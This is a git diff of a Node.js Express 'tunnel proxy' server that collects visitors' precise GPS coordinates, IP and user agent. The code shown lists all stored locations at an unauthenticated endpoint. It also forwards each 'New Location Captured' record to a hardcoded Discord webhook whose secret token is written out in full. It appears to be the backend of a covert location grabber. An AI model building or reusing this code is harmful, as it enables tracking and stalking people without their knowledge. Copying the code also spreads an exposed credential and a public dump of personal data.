@@ -17,44 +17,60 @@ function generateId() {
   return crypto.randomBytes(8).toString('hex');
 }
 
-// ========== NEW: Parse JSON bodies for location data ==========
+// ========== MIDDLEWARE ==========
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
+app.use(express.static(__dirname));
 
-// ========== LOCATION ENDPOINTS ==========
-app.post('/location', (req, res) => {
+// ========== LOCATION API ENDPOINTS ==========
+app.post('/api/location', (req, res) => {
   const locationData = req.body;
   const timestamp = new Date().toISOString();
   
+  console.log('='.repeat(50));
   console.log(`[LOCATION] ${timestamp}`);
-  console.log(`  User: ${locationData.user || 'unknown'}`);
-  console.log(`  Computer: ${locationData.computer || 'unknown'}`);
-  console.log(`  Location: ${locationData.location || 'not provided'}`);
   console.log(`  IP: ${req.ip || 'unknown'}`);
-  console.log(`  Full data: ${JSON.stringify(locationData)}`);
-  console.log('-'.repeat(50));
+  console.log(`  Latitude: ${locationData.latitude}`);
+  console.log(`  Longitude: ${locationData.longitude}`);
+  console.log(`  Accuracy: ${locationData.accuracy} meters`);
+  console.log(`  User Agent: ${locationData.userAgent || 'unknown'}`);
+  console.log('='.repeat(50));
   
-  // Store in memory
-  if (!global.locationLogs) {
-    global.locationLogs = [];
+  // Store in memory (optional)
+  if (!global.locations) {
+    global.locations = [];
   }
-  global.locationLogs.push({
+  global.locations.push({
     timestamp,
     ip: req.ip,
     ...locationData
   });
   
-  res.json({ 
-    status: 'ok', 
-    message: 'Location received',
-    id: global.locationLogs.length 
-  });
+  res.json({ status: 'ok', message: 'Location received', id: global.locations.length });
 });
 
-app.get('/locations', (req, res) => {
+app.post('/api/location/discord', (req, res) => {
+  const locationData = req.body;
+  const discordWebhook = 'https://discord.com/api/webhooks/1481421187211858021/ouKVnU8Zage6vToMZQ4aqRHKMp2ZsuYgGqit9i3Wqwr2L4H1bzsOVy6xrtXFl0fS7Eaw';
+  
+  const message = {
+    content: `**New Location Captured**\nLatitude: ${locationData.latitude}\nLongitude: ${locationData.longitude}\nAccuracy: ${locationData.accuracy}m\nTime: ${locationData.timestamp}`
+  };
+  
+  // Send to Discord (don't wait for response)
+  fetch(discordWebhook, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(message)
+  }).catch(e => console.log('Discord webhook error:', e));
+  
+  res.json({ status: 'ok' });
+});
+
+app.get('/api/locations', (req, res) => {
   res.json({
-    total: global.locationLogs?.length || 0,
-    logs: global.locationLogs || []
+    total: global.locations?.length || 0,
+    locations: global.locations || []
   });
 });
 
@@ -63,29 +79,7 @@ app.get('/ping', (req, res) => {
   res.send('ok');
 });
 
-app.get('/location-test', (req, res) => {
-  res.send(`
-    <html>
-      <head><title>Location API</title></head>
-      <body>
-        <h1>Location API Active</h1>
-        <p>POST to /location with JSON data</p>
-        <p>Example: {"location":"New York","user":"john","computer":"PC01"}</p>
-        <p><a href="/locations">View all stored locations</a></p>
-      </body>
-    </html>
-  `);
-});
-
-// Serve static files
-app.use(express.static(path.join(__dirname, '..')));
-
-// 404 handler
-app.use((req, res) => {
-  res.status(404).send('Not Found');
-});
-
-// ========== WEBSOCKET TUNNEL (existing) ==========
+// ========== WEBSOCKET TUNNEL ==========
 wss.on('connection', (ws, req) => {
   if (req.url.startsWith('/_tunnel')) {
     if (tunnelWs) {
@@ -171,5 +165,6 @@ server.on('upgrade', (request, socket, head) => {
 
 server.listen(port, () => {
   console.log(`Render Tunnel Proxy listening on port ${port}`);
-  console.log(`Location endpoint ready at /location`);
+  console.log(`Location API ready at /api/location`);
+  console.log(`View locations at /api/locations`);
 });
